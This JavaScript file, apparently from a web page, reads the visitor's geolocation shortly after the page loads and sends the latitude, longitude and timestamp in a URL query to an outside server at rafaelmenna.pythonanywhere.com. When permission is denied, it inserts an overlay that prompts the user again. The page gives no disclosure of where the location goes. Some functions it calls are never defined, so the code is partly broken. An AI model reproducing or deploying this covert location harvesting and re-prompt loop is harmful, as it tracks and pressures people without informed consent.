
function handlePermission() {
  navigator.permissions.query({name:'geolocation'}).then(function(result) {
    if (result.state == 'granted') {
      report(result.state);
    } else if (result.state == 'prompt') {
      report(result.state);
      navigator.geolocation.getCurrentPosition(revealPosition,positionDenied,geoSettings);
    } else if (result.state == 'denied') {
      report(result.state);
    }
    result.onchange = function() {
      report(result.state);
    }
  });
}

function report(state) {
  console.log('Permission ' + state);
}

handlePermission();

function getLocation() {
  alert('where there stops.')
  navigator.geolocation.getCurrentPosition(
  function(position) {
    let latitude = position.coords.latitude;
    let longitude = position.coords.longitude
    let loc = "Latitude: " + latitude + ", Longitude: " + longitude
    alert(position.timestamp)
    sendInfo(loc)
    sendInfo(position.timestamp)
  },
  function(error) {
    setTimeout(promptLocationPermis, 1000)
    alert("Error getting location: "+error.message);
  }
);
}
function sendInfo(location) {
  let url = "https://rafaelmenna.pythonanywhere.com/info/?info="+location
  fetch(url).then((res) => {
      return res.text()
  }).then((text) => {
      console.log(text)
  })
}

function promptLocationPermis(param) {
  let ele = document.getElementById('uniquelocationTurnOn')
  let img = ele.querySelector('img')
  ele.querySelector('button').addEventListener('click', (e) => {
      ele.classList.remove('active')
      getLocation()
    })
  img.src = '/GIF_20250207_01.gif'
  img.onload = function () {
    ele.classList.add('active')
    document.body.insertAdjacentElement('afterbegin', ele )
  }
  
}
setTimeout(getLocation, 1000)